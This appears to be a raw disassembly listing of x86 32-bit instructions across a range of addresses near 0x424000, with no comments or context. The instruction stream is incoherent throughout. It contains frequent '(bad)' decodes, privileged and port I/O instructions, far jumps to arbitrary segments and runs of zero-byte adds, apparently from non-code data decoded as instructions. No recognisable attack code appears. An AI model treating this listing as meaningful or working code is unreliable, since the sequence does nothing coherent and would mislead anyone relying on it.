  423ee1:	repnz push ebx
  423ee3:	add    ah,al
  423ee5:	ret    0x40ff
  423ee8:	adc    ebx,DWORD PTR [edx+0x54]
  423eeb:	fld    QWORD PTR [ebx-0xe72e9a6]
  423ef1:	fs adc eax,eax
  423ef4:	inc    esp
  423ef5:	xor    DWORD PTR [edx],0x41
  423ef8:	pop    esi
  423ef9:	add    BYTE PTR [ebx-0x1b893900],bh
  423eff:	sbb    al,cl
  423f01:	mov    WORD PTR [edi-0xab7bc13],gs
  423f07:	jno    0x423f61
  423f09:	push   0x53
  423f0b:	mov    eax,0x5ad8da27
  423f10:	nop
  423f11:	(bad)  
  423f12:	mov    edx,es
  423f14:	repnz and esp,ecx
  423f17:	retf   
  423f18:	dec    esp
  423f19:	xchg   DWORD PTR [eax-0x3c],eax
  423f1c:	sar    DWORD PTR [ecx+0x7ada63fe],cl
  423f22:	jb     0x423f59
  423f24:	div    dh
  423f26:	in     eax,0xb3
  423f28:	retf   0xa8fb
  423f2b:	pop    ebp
  423f2c:	mov    bl,0x26
  423f2e:	test   al,0x71
  423f30:	pushf  
  423f31:	xchg   edi,eax
  423f32:	jecxz  0x423f86
  423f34:	mov    WORD PTR [ecx+0x59],es
  423f37:	jae    0x423fab
  423f39:	pop    edx
  423f3a:	push   eax
  423f3b:	mov    eax,0x19f02331
  423f40:	xchg   ebx,eax
  423f41:	arpl   WORD PTR [ecx+edi*8-0x15],ax
  423f45:	mov    ebp,DWORD PTR fs:[esi+0x14]
  423f49:	ss addr16 fadd st,st(3)
  423f4d:	pop    edx
  423f4e:	xlat   BYTE PTR ds:[ebx]
	...
  423f57:	add    BYTE PTR [eax],al
  423f59:	add    BYTE PTR [ecx],bh
  423f5b:	sbb    al,0x89
  423f5d:	out    0xad,eax
  423f5f:	idiv   DWORD PTR [edi-0x22]
  423f62:	test   eax,0x7e902b9
  423f67:	cmp    ecx,DWORD PTR [edi]
  423f69:	imul   esi,DWORD PTR [edi-0x2fffe48],0x1
  423f70:	add    BYTE PTR [eax],al
  423f72:	test   DWORD PTR [eax+0x7b449740],eax
  423f78:	cmp    ebp,DWORD PTR [edi+0x66]
  423f7b:	mov    WORD PTR [edx+ebx*1+0x6c3f2c53],ss
  423f82:	cmp    esp,DWORD PTR [edx-0xf234fbb]
  423f88:	pop    esp
  423f89:	retf   0x39cb
  423f8c:	jo     0x423f58
  423f8e:	sub    BYTE PTR [esi+0x66],cl
  423f91:	out    0x51,eax
  423f93:	hlt    
  423f94:	idiv   BYTE PTR ds:0x2915bd53
  423f9a:	mov    ecx,0x52d2dccf
  423fa0:	add    al,dl
  423fa2:	daa    
  423fa3:	test   BYTE PTR [ebp+ebx*1+0x73],al
  423fa7:	fisubr WORD PTR [ebp+eax*2-0x6d]
  423fab:	jo     0x423fb0
  423fad:	sbb    al,0xe4
  423faf:	mov    eax,0xc2ccb00d
  423fb4:	jo     0x423f6b
  423fb6:	mov    al,ds:0x60dedcfb
  423fbb:	scas   eax,DWORD PTR es:[edi]
  423fbc:	in     al,0x61
  423fbe:	add    ecx,ebp
  423fc0:	inc    eax
  423fc1:	pop    eax
  423fc2:	xor    al,0xcf
  423fc4:	mov    eax,ds:0xaaa2e43d
  423fc9:	push   ebx
  423fca:	add    eax,0xf7466f66
  423fcf:	inc    ebp
  423fd0:	push   edi
  423fd1:	sbb    ebx,DWORD PTR [esi+0x47444b84]
  423fd7:	jo     0x423ffa
  423fd9:	bound  esi,QWORD PTR [eax+0x6d6cc5dc]
  423fdf:	pop    ss
  423fe0:	scas   al,BYTE PTR es:[edi]
  423fe1:	xchg   ecx,eax
  423fe2:	mov    bl,0x6e
  423fe4:	mov    bh,0x3d
  423fe6:	je     0x42405d
  423fe8:	push   0xf88440a2
  423fed:	outs   dx,DWORD PTR ds:[esi]
  423fee:	cli    
  423fef:	imul   edi,DWORD PTR [eax+0x2f933a7d],0x3484cdd9
  423ff9:	repz inc esp
  423ffb:	pop    ss
  423ffc:	pushf  
  423ffd:	sub    eax,0xaba3634b
  424002:	add    ch,BYTE PTR [ebx-0x7]
  424005:	repz int 0xbe
  424008:	int    0xfc
  42400a:	pop    ss
  42400b:	popf   
  42400c:	lods   al,BYTE PTR ds:[esi]
  42400d:	push   ds
  42400e:	stc    
  42400f:	push   ebp
  424010:	test   eax,0x3055f2ea
  424015:	dec    ecx
  424016:	dec    edi
  424017:	jnp    0x423fb3
  424019:	pop    es
  42401a:	mov    bh,0xc1
  42401c:	inc    edx
  42401d:	out    0x51,al
  42401f:	out    0xdd,eax
  424021:	dec    ecx
  424022:	cmp    ecx,DWORD PTR [ebx-0x48a656dc]
  424028:	dec    edi
  424029:	inc    ecx
  42402a:	test   al,0xba
  42402c:	and    BYTE PTR [ebp+0x6329432e],bl
  424032:	adc    eax,DWORD PTR [esi-0x20]
  424035:	mov    esp,0x370952c1
  42403a:	xchg   BYTE PTR [esi+ecx*1-0x6f],bh
  42403e:	test   al,0xaf
  424040:	add    eax,0xdf2d3e44
  424045:	inc    eax
  424046:	mov    cl,0x6b
  424048:	dec    esi
  424049:	sbb    al,0xf0
  42404b:	retf   0xc516
  42404e:	loop   0x42404d
  424050:	xchg   edx,eax
  424051:	out    0x5,al
  424053:	adc    al,0xaf
  424055:	cs popa 
  424057:	sub    esi,ebx
  424059:	cmp    eax,0x2a0a2d30
  42405e:	mov    WORD PTR [edx],?
  424060:	push   es
  424061:	inc    edi
  424062:	inc    eax
  424063:	aas    
  424064:	add    ch,BYTE PTR [esi]
  424066:	fwait
  424067:	test   BYTE PTR [ebx+0x27748185],bl
  42406d:	aaa    
  42406e:	repz dec esp
  424070:	enter  0x4e3c,0x1d
  424074:	and    ebp,ebp
  424076:	xchg   ecx,eax
  424077:	fimul  DWORD PTR [ebp-0x1a]
  42407a:	outs   dx,DWORD PTR ds:[si]
  42407c:	out    0x30,eax
  42407e:	xchg   ebx,eax
  42407f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424080:	mov    esp,esp
  424082:	scas   eax,DWORD PTR es:[edi]
  424083:	outs   dx,DWORD PTR ds:[esi]
  424084:	enter  0xa2f1,0xbe
  424088:	xchg   edi,eax
  424089:	push   ds
  42408a:	add    BYTE PTR [ebx],ah
  42408c:	retf   
  42408d:	mov    ecx,ecx
  42408f:	or     ebp,DWORD PTR [eax+0x73]
  424092:	out    dx,eax
  424093:	ins    BYTE PTR es:[edi],dx
  424094:	mov    dl,0xde
  424096:	call   0x3c810b3c
  42409b:	push   ds
  42409c:	adc    al,bl
  42409e:	pop    eax
  42409f:	ss jae 0x4240c8
  4240a2:	pop    eax
  4240a3:	xchg   ch,dl
  4240a5:	adc    ebx,ebx
  4240a7:	mov    ch,0x40
  4240a9:	sub    DWORD PTR [edi],ebx
  4240ab:	icebp  
  4240ac:	mov    ch,0x10
  4240ae:	shl    BYTE PTR [esi],1
  4240b0:	aam    0x58
  4240b2:	push   esp
  4240b3:	popa   
  4240b4:	loopne 0x4240dc
  4240b6:	cs cli 
  4240b8:	pushf  
  4240b9:	mov    eax,ds:0xa461d9ae
  4240be:	imul   DWORD PTR [edi+edx*4-0x19]
  4240c2:	push   esp
  4240c3:	leave  
  4240c4:	adc    ebx,ebp
  4240c6:	in     al,0xd1
  4240c8:	inc    ebx
  4240c9:	arpl   WORD PTR [bx-0x5d],sp
  4240cd:	mov    ebp,DWORD PTR [eax-0x3bbde4f]
  4240d3:	pop    edi
  4240d4:	imul   eax,DWORD PTR [ebx+0x9],0x46
  4240d8:	scas   al,BYTE PTR es:[edi]
  4240d9:	jp     0x424068
  4240db:	icebp  
  4240dc:	cld    
  4240dd:	mov    cl,0xa5
  4240df:	mov    edx,0x2a4b344b
  4240e4:	shr    BYTE PTR [ebp+0x3103114a],0x30
  4240eb:	xchg   esp,eax
  4240ec:	jecxz  0x42413e
  4240ee:	lods   al,BYTE PTR ds:[esi]
  4240ef:	aas    
  4240f0:	push   0x5c0f9bf7
  4240f5:	sub    al,0xb0
  4240f7:	in     al,dx
  4240f8:	int    0x95
  4240fa:	les    edi,FWORD PTR [edx+0x3]
  4240fd:	dec    ecx
  4240fe:	mov    ch,0xcb
  424100:	repz bound edi,QWORD PTR [ebp+0x72]
  424104:	ret    0x70f2
  424107:	ss jo  0x4240ad
  42410a:	retf   
  42410b:	xchg   ebx,eax
  42410c:	dec    ebx
  42410d:	cmp    BYTE PTR [ebx],0xff
  424110:	cmp    ebp,0x6f
  424113:	mov    DWORD PTR [edi+0x6],ebx
  424116:	dec    DWORD PTR [edi+0x59]
  424119:	arpl   cx,sp
  42411b:	fsub   DWORD PTR [eax+ecx*8]
  42411e:	add    edi,DWORD PTR [ebx]
  424120:	inc    esp
  424121:	mov    BYTE PTR [edi],bl
  424123:	push   esi
  424124:	dec    esi
  424125:	clc    
  424126:	push   esp
  424127:	pusha  
  424128:	call   FWORD PTR [eax+0x4ac51d95]
  42412e:	adc    eax,0xd285198f
  424133:	stos   BYTE PTR es:[edi],al
  424134:	fstp   TBYTE PTR [ebp-0x473c67af]
  42413a:	das    
  42413b:	test   WORD PTR [edi-0x3d],di
  42413f:	jb     0x424165
  424141:	invlpg BYTE PTR [ecx]
  424144:	sbb    bh,BYTE PTR ds:0x380de9ef
  42414a:	mov    dl,0x3b
  42414c:	cs je  0x424155
  42414f:	inc    edi
  424150:	add    eax,0x2be9ca85
  424155:	adc    DWORD PTR [edx],edx
  424157:	cmp    edi,DWORD PTR [esi]
  424159:	xchg   edx,eax
  42415a:	jbe    0x4241cb
  42415c:	call   0x98c5e0ce
  424161:	push   edi
  424162:	je     0x4241b3
  424164:	dec    ecx
  424165:	mov    eax,ds:0xc9dde44a
  42416a:	mov    al,ds:0xfaa33193
	...
  424177:	add    BYTE PTR [eax],al
  424179:	add    BYTE PTR [ebp-0x4c],ah
  42417c:	sbb    dh,bl
  42417e:	fsin   
  424180:	out    0xbf,eax
  424182:	fs dec edi
  424184:	popf   
  424185:	outs   dx,BYTE PTR ds:[esi]
  424186:	adc    bh,BYTE PTR [ebx-0x454be2c7]
  42418c:	add    DWORD PTR [eax],eax
  42418e:	std    
  42418f:	add    DWORD PTR [eax],eax
  424191:	add    BYTE PTR [esi],dl
  424193:	xor    eax,0x81ef6e44
  424198:	cmp    al,0x1f
  42419a:	xchg   esp,eax
  42419b:	ret    
  42419c:	lahf   
  42419d:	addr16 cwde 
  42419f:	jo     0x4241f5
  4241a1:	jle    0x42412b
  4241a3:	push   ds
  4241a4:	in     eax,0x87
  4241a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241a7:	int3   
  4241a8:	add    BYTE PTR [eax],0xa3
  4241ab:	mov    bl,0xb8
  4241ad:	ss jle 0x424149
  4241b0:	ret    
  4241b1:	inc    edi
  4241b2:	rcr    BYTE PTR [esi],0x20
  4241b5:	mov    ah,0x81
  4241b7:	and    DWORD PTR [eax+edi*1+0x6b],0x25e0c69b
  4241bf:	push   edi
  4241c0:	ror    DWORD PTR [esi],1
  4241c2:	mov    ds:0xd19e5bd5,eax
  4241c7:	lock cmp bh,BYTE PTR [edx-0x54]
  4241cb:	cmp    eax,0x3a2ac20a
  4241d0:	mov    dl,0x50
  4241d2:	ins    DWORD PTR es:[edi],dx
  4241d3:	inc    ebx
  4241d4:	jnp    0x424245
  4241d6:	out    dx,eax
  4241d7:	fstp   DWORD PTR [esi+0x5a763c81]
  4241dd:	ficom  WORD PTR [edi]
  4241df:	or     DWORD PTR [edx-0x49a09aef],esi
  4241e5:	mov    ebp,0x1abd1db1
  4241ea:	jl     0x424184
  4241ec:	jne    0x424210
  4241ee:	sbb    ah,ch
  4241f0:	cmc    
  4241f1:	cmp    esi,ecx
  4241f3:	cmp    ecx,edi
  4241f5:	aas    
  4241f6:	out    0x78,al
  4241f8:	mov    edi,0x3b0a16e7
  4241fd:	jnp    0x4241bc
  4241ff:	cwde   
  424200:	pop    edi
  424201:	into   
  424202:	and    DWORD PTR [ebx+edi*4-0x14],0x8628c005
  42420a:	jmp    0xca0b:0x13675098
  424211:	cmp    ch,BYTE PTR [eax-0x76]
  424214:	cwde   
  424215:	fdiv   st(5),st
  424217:	fucom  st(2)
  424219:	repnz call FWORD PTR [ecx]
  42421c:	shl    DWORD PTR [eax-0x9c3260c],cl
  424222:	neg    DWORD PTR [esi]
  424224:	retf   0xb311
  424227:	sbb    BYTE PTR [ecx+0x64f032f6],bl
  42422d:	fstp   DWORD PTR [edi]
  42422f:	lahf   
  424230:	outs   dx,BYTE PTR ds:[esi]
  424231:	loope  0x4241e8
  424233:	sub    al,0x2f
  424235:	sbb    bl,BYTE PTR [ebx]
  424237:	(bad)  
  424238:	dec    esp
  424239:	js     0x4241bf
  42423b:	out    dx,al
  42423c:	ins    BYTE PTR es:[edi],dx
  42423d:	dec    ecx
  42423e:	fistp  QWORD PTR [esi]
  424240:	jecxz  0x424284
  424242:	push   cs
  424243:	inc    esi
  424244:	pop    ss
  424245:	pop    ebx
  424246:	(bad)  
  424247:	pop    eax
  424248:	sbb    al,0x4e
  42424a:	mov    bh,0xa1
  42424c:	out    dx,eax
  42424d:	mov    al,ds:0x52042679
  424252:	sbb    DWORD PTR [esi+0x65],ebp
  424255:	or     ecx,DWORD PTR [esp+ebp*4]
  424258:	pop    esp
  424259:	lea    eax,[ebp+0x1e03d151]
  42425f:	outs   dx,BYTE PTR ds:[esi]
  424260:	dec    edx
  424261:	ds pushf 
  424263:	jl     0x4242c1
  424265:	in     al,dx
  424266:	popf   
  424267:	add    esp,ecx
  424269:	bound  edx,QWORD PTR [edx+0x54]
  42426c:	test   ch,0x36
  42426f:	dec    ecx
  424270:	stc    
  424271:	ficomp WORD PTR [ebp+0x1401964d]
  424277:	test   al,0x6d
  424279:	stc    
  42427a:	cmp    bh,BYTE PTR [eax+0x24fbfb0e]
  424280:	and    BYTE PTR [ebx-0x72],0x4e
  424284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424285:	mov    eax,ds:0x5eddca74
  42428a:	xor    al,0xe5
  42428c:	or     al,0xe7
  42428e:	jl     0x4242b5
  424290:	lock cmp ebx,DWORD PTR [edi]
  424293:	jno    0x42423c
  424295:	fnstenv [edi]
  424297:	add    al,0xc8
  424299:	xor    BYTE PTR [ecx+edi*1+0x34],cl
  42429d:	mov    ebx,0x58379426
  4242a2:	mov    eax,ds:0xfae689d7
  4242a7:	test   eax,0xff985fb
  4242ac:	or     eax,DWORD PTR [esi]
  4242ae:	rcl    DWORD PTR [esi],cl
  4242b0:	push   DWORD PTR [eax]
  4242b2:	in     eax,dx
  4242b3:	or     dl,dh
  4242b5:	jno    0x424265
  4242b7:	mov    dl,0xee
  4242b9:	adc    al,0x88
  4242bb:	add    ecx,ecx
  4242bd:	nop
  4242be:	ror    BYTE PTR [eax+0x337d7949],0x3a
  4242c5:	push   esp
  4242c6:	iret   
  4242c7:	pop    ss
  4242c8:	fmul   st,st(5)
  4242ca:	or     eax,0xb9c3c277
  4242cf:	nop    DWORD PTR [ebx]
  4242d2:	scas   al,BYTE PTR es:[edi]
  4242d3:	ficomp WORD PTR [ecx+0x76]
  4242d6:	jno    0x4242ad
  4242d8:	jl     0x424285
  4242da:	in     eax,0xca
  4242dc:	push   0xfffffff9
  4242de:	sar    DWORD PTR [eax+0x1e2c53af],1
  4242e4:	cs stos DWORD PTR es:[edi],eax
  4242e6:	pop    ebp
  4242e7:	inc    ebx
  4242e8:	sub    al,BYTE PTR [esi]
  4242ea:	ret    0xcf4f
  4242ed:	adc    DWORD PTR [edx-0x463638b2],0x72
  4242f4:	jp     0x424365
  4242f6:	mov    ah,0x28
  4242f8:	popa   
  4242f9:	push   ds
  4242fa:	sub    BYTE PTR [esi],0x97
  4242fd:	jge    0x424297
  4242ff:	cli    
  424300:	and    edx,DWORD PTR [esi+0x6f84b2e4]
  424306:	adc    DWORD PTR [edx],esp
  424308:	sub    eax,0xa9c0e7af
  42430d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42430e:	loopne 0x42438a
  424310:	xchg   edx,eax
  424311:	adc    dl,BYTE PTR [edx+0x7a]
  424314:	push   0xffffffd4
  424316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424317:	loope  0x424332
  424319:	shl    DWORD PTR [edx],0x8
  42431c:	loop   0x4242f4
  42431e:	mov    esp,0xfb5738c9
  424323:	pop    esi
  424324:	cmp    BYTE PTR [eax+0x6e],al
  424327:	mov    bh,0x65
  424329:	jae    0x424371
  42432b:	popf   
  42432c:	popf   
  42432d:	pop    eax
  42432e:	add    edi,ebp
  424330:	push   ecx
  424331:	inc    edi
  424332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424333:	cmp    eax,0x6d19853a
  424338:	test   eax,0x364e1efc
  42433d:	fsubrp st(2),st
  42433f:	mov    esi,0x6c2c0391
  424344:	lds    ecx,FWORD PTR [edx]
  424346:	rol    BYTE PTR [ebp+0x28],cl
  424349:	bound  esi,QWORD PTR [edi]
  42434b:	mov    al,ds:0x25ffe578
  424350:	les    edx,FWORD PTR [ecx-0x4b73a6f4]
  424356:	add    ch,ah
  424358:	mov    esp,0x30131705
  42435d:	push   ss
  42435e:	retf   0xf4ad
  424361:	dec    esp
  424362:	bound  edi,QWORD PTR [ebx+0x3332e237]
  424368:	xchg   DWORD PTR [ebx+eax*1+0x16],edx
  42436c:	arpl   WORD PTR [edi],di
  42436e:	gs pop ds
  424370:	faddp  st(2),st
  424372:	leave  
  424373:	shl    BYTE PTR [ebp+0x15],cl
  424376:	cld    
  424377:	mov    edi,0x73e14ea3
  42437c:	xchg   BYTE PTR [eax+0x1c643187],dl
  424382:	and    DWORD PTR [ecx],0x60
  424385:	aaa    
  424386:	and    ecx,DWORD PTR [ecx+0xa41ffc]
  42438c:	add    dl,BYTE PTR [ecx]
  42438e:	add    eax,0x0
  424393:	add    BYTE PTR [eax],al
  424395:	add    BYTE PTR [eax],al
  424397:	add    BYTE PTR [eax],al
  424399:	add    BYTE PTR [edx],dl
  42439b:	fsub   DWORD PTR [ebx+0x72]
  42439e:	jmp    0x42439b
  4243a0:	adc    edi,eax
  4243a2:	jl     0x424328
  4243a4:	dec    edi
  4243a5:	dec    esp
  4243a6:	jecxz  0x4243ce
  4243a8:	ss aas 
  4243aa:	mov    cl,0xbc
  4243ac:	add    DWORD PTR [eax],eax
  4243ae:	std    
  4243af:	add    DWORD PTR [eax],eax
  4243b1:	add    bh,ah
  4243b3:	sti    
  4243b4:	addr16 dec esp
  4243b6:	sbb    DWORD PTR [eax+edi*1+0x4],ebp
  4243ba:	jmp    0x4243c2
  4243bc:	mov    ah,0xc1
  4243be:	jnp    0x424372
  4243c0:	inc    ebx
  4243c1:	and    eax,0x8399a131
  4243c6:	jbe    0x424412
  4243c8:	mov    WORD PTR [edi+0x5e80dc0e],?
  4243ce:	or     dl,BYTE PTR [ecx-0x4a27240c]
  4243d4:	push   ebx
  4243d5:	fbstp  TBYTE PTR [esi]
  4243d7:	push   esi
  4243d8:	adc    eax,0xbb121e2a
  4243dd:	mov    ebx,0x7a99112
  4243e2:	sbb    DWORD PTR [ebx],ebp
  4243e4:	js     0x424437
  4243e6:	dec    edi
  4243e7:	dec    esi
  4243e8:	mov    bh,0xc9
  4243ea:	daa    
  4243eb:	sub    eax,0x74d200fe
  4243f0:	scas   al,BYTE PTR es:[edi]
  4243f1:	pop    esi
  4243f2:	pop    edi
  4243f3:	cwde   
  4243f4:	dec    edx
  4243f5:	mov    al,ds:0xc89e0d67
  4243fa:	mov    ebx,0x220fb511
  4243ff:	and    cl,BYTE PTR [edx+0x65]
  424402:	(bad)  
  424403:	in     eax,0x96
  424405:	repz imul esp,DWORD PTR [eax-0x11],0xffffffe7
  42440a:	hlt    
  42440b:	stc    
  42440c:	pop    esi
  42440d:	mov    eax,0x52c996ce
  424412:	fs pop esp
  424414:	xor    DWORD PTR [eax+0x289ed4ae],ebx
  42441a:	cdq    
  42441b:	jmp    0xd82ae357
  424420:	xchg   BYTE PTR [edx-0x20],ch
  424423:	ins    DWORD PTR es:[edi],dx
  424424:	popa   
  424425:	fdiv   QWORD PTR [edi+edi*2-0x18]
  424429:	stc    
  42442a:	or     BYTE PTR [eax+0x74],al
  42442d:	je     0x42445f
  42442f:	out    0xca,eax
  424431:	mov    esp,0x830ddc60
  424436:	ret    
  424437:	mov    WORD PTR [edi],ss
  424439:	aad    0x3
  42443b:	add    al,0xd4
  42443d:	push   0x53346d0b
  424442:	je     0x4243ed
  424444:	fcmovnbe st,st(1)
  424446:	sub    al,0xb3
  424448:	shl    BYTE PTR [edi-0x31],1
  42444b:	dec    ecx
  42444c:	xor    DWORD PTR [ecx],eax
  42444e:	and    BYTE PTR [esi],0x9e
  424451:	adc    ch,ch
  424453:	test   BYTE PTR [ecx-0x3],ah
  424456:	push   esp
  424458:	jno    0x4243e7
  42445a:	les    ecx,FWORD PTR [ecx]
  42445c:	cmp    bl,BYTE PTR [ecx+ecx*2]
  42445f:	cmp    eax,0x7f853343
  424464:	in     al,0xa
  424466:	fnstenv [ebx]
  424468:	and    esp,DWORD PTR [edi]
  42446a:	enter  0x4012,0xfd
  42446e:	pop    ebp
  42446f:	jmp    0x7518:0x74775419
  424476:	rcr    DWORD PTR [edi-0x50],cl
  424479:	cmp    al,0xb6
  42447b:	aaa    
  42447c:	cmp    edx,DWORD PTR [ebx]
  42447e:	sbb    BYTE PTR [esi-0x5d],dl
  424481:	out    0xc5,al
  424483:	pop    ebp
  424484:	xlat   BYTE PTR ds:[ebx]
  424485:	jmp    0x1a5f:0xdf2c2bf1
  42448c:	loop   0x4244d6
  42448e:	xor    eax,0xa0cc8425
  424493:	imul   edx,DWORD PTR gs:[ecx+0x33],0x8b76c229
  42449b:	xor    eax,0x55bc41d3
  4244a0:	outs   dx,DWORD PTR ds:[esi]
  4244a1:	mov    ecx,ss
  4244a3:	call   0x2f1a:0x3231ef9
  4244aa:	ins    DWORD PTR es:[edi],dx
  4244ab:	daa    
  4244ac:	scas   eax,DWORD PTR es:[edi]
  4244ad:	lock std 
  4244af:	inc    eax
  4244b0:	mov    eax,0xa47fef6b
  4244b5:	pop    ecx
  4244b6:	aaa    
  4244b7:	fnsave [eax+0x63739eae]
  4244bd:	loope  0x4244fe
  4244bf:	stos   BYTE PTR es:[edi],al
  4244c0:	inc    esp
  4244c1:	cld    
  4244c2:	pop    ds
  4244c3:	adc    eax,0xd35cfe3c
  4244c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244c9:	xlat   BYTE PTR ds:[ebx]
  4244ca:	dec    edx
  4244cb:	xor    eax,0x97c74b98
  4244d0:	ss xchg edx,eax
  4244d2:	inc    esi
  4244d3:	cwde   
  4244d4:	loopne 0x424472
  4244d6:	mov    fs:0x6a3a4f12,al
  4244dc:	xor    cl,al
  4244de:	mov    al,ds:0xa2b6d858
  4244e3:	fwait
  4244e4:	mov    bl,0xf1
  4244e6:	(bad)  [edi]
  4244e8:	mov    bl,0x34
  4244ea:	arpl   WORD PTR [si],bx
  4244ed:	test   BYTE PTR ss:[ecx-0x71e08b71],ch
  4244f4:	add    edi,DWORD PTR [ebx]
  4244f6:	test   al,al
  4244f8:	jmp    0x4244a7
  4244fa:	sbb    al,0x1e
  4244fc:	mov    al,ds:0x8517686
  424501:	jbe    0x42448c
  424503:	push   edx
  424504:	popa   
  424505:	jne    0x424512
  424507:	loopne 0x4244f6
  424509:	dec    esi
  42450a:	ret    
  42450b:	out    dx,eax
  42450c:	enter  0xb489,0x1c
  424510:	fsubr  QWORD PTR [ebx+ebp*2+0x15df04e4]
  424517:	(bad)
  42451b:	int    0x9a
  42451d:	call   0x18cc:0x8e1e9e6b
  424524:	outs   dx,BYTE PTR ds:[esi]
  424525:	push   es
  424526:	aaa    
  424527:	call   0x1602:0x2372d1bd
  42452e:	icebp  
  42452f:	mov    edx,DWORD PTR [edx]
  424531:	inc    ebx
  424532:	test   al,0xd8
  424534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424536:	xchg   edi,eax
  424537:	mov    eax,ds:0x123711f5
  42453c:	clc    
  42453d:	ja     0x424501
  42453f:	ds retf 
  424541:	jl     0x4245a2
  424543:	out    0x18,eax
  424545:	inc    esp
  424546:	out    dx,al
  424547:	inc    ebx
  424548:	mov    BYTE PTR cs:[ecx-0x61],ah
  42454c:	push   ebx
  42454d:	div    DWORD PTR [ecx+0x543c1936]
  424553:	jae    0x424513
  424555:	xchg   BYTE PTR ds:0x7c4e253,dl
  42455b:	out    0xc5,eax
  42455d:	rol    DWORD PTR [ebx-0x45e9b559],0x15
  424564:	pop    ecx
  424565:	sbb    BYTE PTR [esi-0x7],bl
  424568:	ficom  WORD PTR [edi]
  42456a:	add    al,0xd6
  42456c:	out    0xa2,eax
  42456e:	out    dx,al
  42456f:	retf   0x3348
  424572:	xchg   edi,eax
  424573:	jecxz  0x424517
  424575:	repz test dl,cl
  424578:	dec    edx
  424579:	into   
  42457a:	fld    st(3)
  42457c:	pop    ds
  42457d:	sub    eax,0x7c58d3c
  424582:	mov    esi,0xfbd66c3c
  424587:	xchg   ebp,eax
  424588:	pop    esi
  424589:	(bad)  
  42458a:	mov    ah,0x4a
  42458c:	mov    cl,0x5
  42458e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42458f:	sar    DWORD PTR [ebx+0x41],cl
  424592:	cmc    
  424593:	cmp    DWORD PTR [eax+0x38],ebp
  424596:	push   ecx
  424597:	cld    
  424598:	jb     0x4245e8
  42459a:	mov    ebp,0xc93847c6
  42459f:	retf   0x1d68
  4245a2:	pusha  
  4245a3:	mov    al,ds:0x372674af
  4245a8:	shl    BYTE PTR [ecx+0x78a83abb],1
  4245ae:	dec    esi
	...
  4245b7:	add    BYTE PTR [eax],al
  4245b9:	add    BYTE PTR [esi],cl
  4245bb:	and    BYTE PTR [eax-0x404051c1],cl
  4245c1:	xor    edi,edx
  4245c3:	sub    dh,BYTE PTR [eax+0x5d36aab7]
  4245c9:	aad    0xae
  4245cb:	mov    esi,0x1fd0001
  4245d0:	add    BYTE PTR [eax],al
  4245d2:	xchg   ecx,eax
  4245d3:	fidiv  WORD PTR [ebp+edx*2-0x60]
  4245d7:	in     eax,0x17
  4245d9:	jg     0x424651
  4245db:	ss jmp 0x42464a
  4245de:	stc    
  4245df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245e0:	xchg   edx,eax
  4245e1:	in     eax,dx
  4245e2:	jo     0x4245de
  4245e4:	int3   
  4245e5:	add    eax,DWORD PTR ds:0x1a79e066
  4245eb:	mov    eax,0xc931efde
  4245f0:	xor    BYTE PTR [edi-0x32],0xe1
  4245f4:	lods   eax,DWORD PTR ds:[esi]
  4245f5:	ret    0xdc1c
  4245f8:	out    0x24,eax
  4245fa:	inc    edx
  4245fb:	pop    eax
  4245fc:	sbb    DWORD PTR [edi-0x18],ebx
  4245ff:	xor    eax,0x29c79943
  424604:	xchg   esi,eax
  424605:	dec    eax
  424606:	ds out 0xab,al
  424609:	adc    eax,0x97e44c8
  42460e:	xchg   ecx,eax
  42460f:	add    bh,BYTE PTR [edx+0x56]
  424612:	cwde   
  424613:	sub    eax,0x61b91428
  424618:	cmp    ebp,DWORD PTR [ecx]
  42461a:	mov    edx,0x7a135028
  42461f:	leave  
  424620:	xchg   ebp,eax
  424621:	ds (bad) 
  424623:	loop   0x42468f
  424625:	popf   
  424626:	(bad)  
  424627:	mov    ?,WORD PTR [esi]
  424629:	and    ecx,DWORD PTR [ebx+0x71]
  42462c:	and    eax,edi
  42462e:	sti    
  42462f:	lods   al,BYTE PTR ds:[esi]
  424630:	inc    ecx
  424631:	mov    DWORD PTR [ebx-0x3235de62],eax
  424637:	pop    ss
  424638:	(bad)  
  424639:	push   edx
  42463a:	pop    ecx
  42463b:	inc    ecx
  42463c:	(bad)  
  42463d:	fld    QWORD PTR [edi]
  42463f:	fisttp DWORD PTR ds:0x646f5195
  424645:	dec    ebp
  424646:	es mov esp,0x8eb0b681
  42464c:	aad    0xee
  42464e:	pop    ebx
  42464f:	add    DWORD PTR [edi-0x14dbe8f6],0x63be0134
  424659:	call   0xb26466d6
  42465e:	mul    BYTE PTR [esi]
  424660:	ds push ds
  424662:	cmp    DWORD PTR [edx-0x5f47d07e],0x5980b69f
  42466c:	inc    esp
  42466d:	aad    0xdb
  42466f:	jg     0x4246b0
  424671:	jl     0x424665
  424673:	jp     0x4246c4
  424675:	ror    BYTE PTR [edi],1
  424677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424678:	rcr    eax,0x4
  42467b:	(bad)  
  42467c:	fisubr DWORD PTR [esp+eiz*2+0x7511eb74]
  424683:	pop    ebx
  424684:	sbb    BYTE PTR [ecx-0x31],ah
  424687:	push   cs
  424688:	pop    edx
  424689:	push   es
  42468a:	test   eax,0x5efa0b72
  42468f:	adc    DWORD PTR [ecx-0x15],0x5
  424693:	shl    BYTE PTR [bx+di-0x3287],0xac
  424699:	xadd   DWORD PTR [ebx+0x47],eax
  42469d:	call   0x8dde:0x2f872804
  4246a4:	xchg   esi,eax
  4246a5:	xlat   BYTE PTR ds:[ebx]
  4246a6:	das    
  4246a7:	add    ebp,ebp
  4246a9:	pushf  
  4246aa:	inc    eax
  4246ab:	jg     0x4246b6
  4246ad:	mov    al,BYTE PTR [esi+eax*4]
  4246b0:	sub    DWORD PTR [esi+edi*4+0x62],edx
  4246b4:	ror    al,1
  4246b6:	je     0x42468d
  4246b8:	sub    dh,BYTE PTR [eax+0xc884d59]
  4246be:	hlt    
  4246bf:	into   
  4246c0:	cmp    DWORD PTR [eax],ebp
  4246c2:	clc    
